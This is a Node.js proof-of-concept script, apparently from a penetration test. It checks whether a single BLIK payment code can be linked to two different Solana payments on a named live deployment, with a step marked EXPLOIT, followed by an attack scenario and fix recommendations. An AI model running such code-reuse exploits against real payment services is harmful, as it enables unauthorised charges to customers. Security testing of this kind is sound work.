#!/usr/bin/env node
/**
 * AUTHZ-VULN-07: Code Reuse Vulnerability Test
 * Tests if a single BLIK code can be linked to multiple payments
 */

const https = require('https');

const BASE_URL = 'solana-blik.vercel.app';

function printStep(stepNum, title) {
    console.log(`\n${'='.repeat(70)}`);
    console.log(`STEP ${stepNum}: ${title}`);
    console.log(`${'='.repeat(70)}`);
}

function printResponse(statusCode, body) {
    console.log(`Status Code: ${statusCode}`);
    console.log(`Response Body:`);
    console.log(JSON.stringify(body, null, 2));
}

function makeRequest(path, data) {
    return new Promise((resolve, reject) => {
        const postData = JSON.stringify(data);

        const options = {
            hostname: BASE_URL,
            path: path,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(body);
                    resolve({ statusCode: res.statusCode, body: parsed });
                } catch (e) {
                    resolve({ statusCode: res.statusCode, body: body });
                }
            });
        });

        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

async function main() {
    console.log(`\n${'#'.repeat(70)}`);
    console.log(`# AUTHZ-VULN-07: Code Reuse Vulnerability Test`);
    console.log(`# Testing if single code can be linked to multiple payments`);
    console.log(`# Timestamp: ${new Date().toISOString()}`);
    console.log(`${'#'.repeat(70)}\n`);

    try {
        // Step 1: Create Payment A
        printStep(1, "Create Payment A (Merchant 1, Amount: 1.0 SOL)");
        const paymentAData = {
            amount: 1.0,
            merchantWallet: "11111111111111111111111111111111"
        };
        const responseA = await makeRequest('/api/payments/create', paymentAData);
        printResponse(responseA.statusCode, responseA.body);

        if (responseA.statusCode !== 200) {
            console.log("\n❌ FAILED: Could not create Payment A");
            return;
        }

        const paymentAId = responseA.body.paymentId;
        console.log(`\n✓ Payment A ID: ${paymentAId}`);

        // Step 2: Create Payment B
        printStep(2, "Create Payment B (Merchant 2, Amount: 2.0 SOL)");
        const paymentBData = {
            amount: 2.0,
            merchantWallet: "22222222222222222222222222222222"
        };
        const responseB = await makeRequest('/api/payments/create', paymentBData);
        printResponse(responseB.statusCode, responseB.body);

        if (responseB.statusCode !== 200) {
            console.log("\n❌ FAILED: Could not create Payment B");
            return;
        }

        const paymentBId = responseB.body.paymentId;
        console.log(`\n✓ Payment B ID: ${paymentBId}`);

        // Step 3: Generate a single code
        printStep(3, "Generate Single BLIK Code (Customer)");
        const codeData = {
            walletPubkey: "33333333333333333333333333333333"
        };
        const responseCode = await makeRequest('/api/codes/generate', codeData);
        printResponse(responseCode.statusCode, responseCode.body);

        if (responseCode.statusCode !== 200) {
            console.log("\n❌ FAILED: Could not generate code");
            return;
        }

        const code = responseCode.body.code;
        console.log(`\n✓ Generated Code: ${code}`);

        // Step 4: Link code to Payment A
        printStep(4, "Link Code to Payment A (First Linking - Should Succeed)");
        const linkAData = {
            paymentId: paymentAId,
            code: code
        };
        const responseLinkA = await makeRequest('/api/payments/link', linkAData);
        printResponse(responseLinkA.statusCode, responseLinkA.body);

        if (responseLinkA.statusCode !== 200) {
            console.log("\n❌ FAILED: Could not link code to Payment A");
            return;
        }

        const matchedA = responseLinkA.body.matched;
        console.log(`\n✓ First Link Status: matched=${matchedA}`);

        // Step 5: EXPLOIT - Try to link SAME code to Payment B
        printStep(5, "🔴 EXPLOIT: Try to Link SAME Code to Payment B");
        console.log(`Attempting to reuse code: ${code}`);
        console.log(`Target Payment B ID: ${paymentBId}`);

        const linkBData = {
            paymentId: paymentBId,
            code: code
        };
        const responseLinkB = await makeRequest('/api/payments/link', linkBData);
        printResponse(responseLinkB.statusCode, responseLinkB.body);

        // Analyze results
        console.log(`\n${'='.repeat(70)}`);
        console.log("VULNERABILITY ANALYSIS");
        console.log(`${'='.repeat(70)}\n`);

        if (responseLinkB.statusCode === 200) {
            const matchedB = responseLinkB.body.matched;

            if (matchedB) {
                console.log("🚨 VULNERABILITY CONFIRMED: AUTHZ-VULN-07");
                console.log("=".repeat(70));
                console.log("\nSEVERITY: HIGH");
                console.log("\nDESCRIPTION:");
                console.log("  A single BLIK code can be linked to multiple payment requests.");
                console.log("  This allows one customer approval to authorize payments to");
                console.log("  multiple different merchants.");
                console.log("\nEVIDENCE:");
                console.log(`  - Payment A (1.0 SOL to Merchant 1): Linked successfully`);
                console.log(`  - Payment B (2.0 SOL to Merchant 2): ALSO linked successfully`);
                console.log(`  - Same code used: ${code}`);
                console.log("\nIMPACT:");
                console.log("  1. Customer approves ONE code");
                console.log("  2. Malicious actor links it to multiple payments");
                console.log("  3. Customer unknowingly pays multiple merchants");
                console.log(`  4. Total exposure: 1.0 + 2.0 = 3.0 SOL from single approval`);
                console.log("\nATTACK SCENARIO:");
                console.log("  1. Customer generates code for 1 SOL payment to Merchant A");
                console.log("  2. Attacker intercepts/observes the code");
                console.log("  3. Attacker creates payment request for 2 SOL to Merchant B");
                console.log("  4. Attacker links the SAME code to their payment");
                console.log("  5. Both payments execute with single customer approval");
                console.log("\nRECOMMENDATION:");
                console.log("  - Implement one-to-one code-to-payment constraint");
                console.log("  - Mark codes as 'used' after first successful link");
                console.log("  - Add database uniqueness constraint on code linking");
                console.log("  - Implement atomic code consumption with race condition protection");
            } else {
                console.log("✅ SECURE: Code reuse prevented");
                console.log(`  Step 5 returned matched=false`);
            }
        } else if (responseLinkB.statusCode === 400) {
            console.log("✅ SECURE: Code reuse prevented");
            console.log(`  Step 5 returned 400 error (code already used)`);
        } else if (responseLinkB.statusCode === 404) {
            console.log("✅ SECURE: Code reuse prevented");
            console.log(`  Step 5 returned 404 error (code not found/consumed)`);
        } else {
            console.log(`⚠️  UNEXPECTED: Step 5 returned status ${responseLinkB.statusCode}`);
        }

        console.log("\n" + "=".repeat(70));

    } catch (error) {
        console.error("\n❌ ERROR:", error.message);
        console.error(error.stack);
    }
}

main();
